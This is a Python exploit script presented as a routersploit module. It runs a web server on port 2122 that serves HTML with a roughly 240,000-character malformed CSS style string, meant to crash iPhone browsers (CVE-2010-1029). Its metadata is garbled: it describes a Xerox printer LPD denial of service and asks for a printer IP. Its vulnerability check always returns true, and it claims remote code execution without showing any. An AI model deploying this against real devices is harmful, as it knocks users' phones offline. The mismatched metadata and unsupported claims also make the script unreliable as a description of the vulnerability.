#!/usr/bin/python
#                       ,
#                      dM
#                      MMr
#                     4MMML                  .
#                     MMMMM.                xf
#     .              "M6MMM               .MM-
#      Mh..          +MM5MMM            .MMMM
#      .MMM.         .MMMMML.          MMMMMh
#       )MMMh.        MM5MMM         MMMMMMM
#        3MMMMx.     'MMM3MMf      xnMMMMMM"
#        '*MMMMM      MMMMMM.     nMMMMMMP"
#          *MMMMMx    "MMM5M\    .MMMMMMM=
#           *MMMMMh   "MMMMM"   JMMMMMMP
#             MMMMMM   GMMMM.  dMMMMMM            .
#              MMMMMM  "MMMM  .MMMMM(        .nnMP"
#   ..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*
#    "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"
#     "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
#       ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
#          *PMMMMMMhn. *x > M  .MMMM**""
#             ""**MMMMhx/.h/ .=*"
#                      .3P"%....
#             [t12]  nP"     "*MMnx 

#		    SMOKE WEED
#greetz to my blackhatz and baycatz
#iPhone CSS::Selector crash
#this Python script acts as a web server and sends a malformed long string to the CSS <style> tag
#this is a remote crash bug, hoever an analysis of the debug dump shows remote code execution capability, I am just lazy

import sys, socket;
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "printer Ip Address")



    __info__ = {

        "name": "CVE-2010-1029",
        "description": "Xerox WorkCentre (Multiple Models) - Denial of Service"
                       "Device freezes when it is flooded with LPD requests having oversized "
                       "queue name length AND other features of the device are accessed ",
        "authors": (
            "t12",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/11574",
        ),
        "devices": (
            "iphone","CVE-2010-1029"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            junk = "*>" * 120000
            
            html = """
                <html>
                <head>
                <style type="text/css">
                """

            html += junk

            html += """
                body {background: blue;}
                </style>
                </head>
                </html>
                """

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('',2122))
            s.listen(1)
            
            while True:
                channel, details = s.accept()
                print_status(channel.recv(1024))
                channel.send(html)
                channel.close()
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
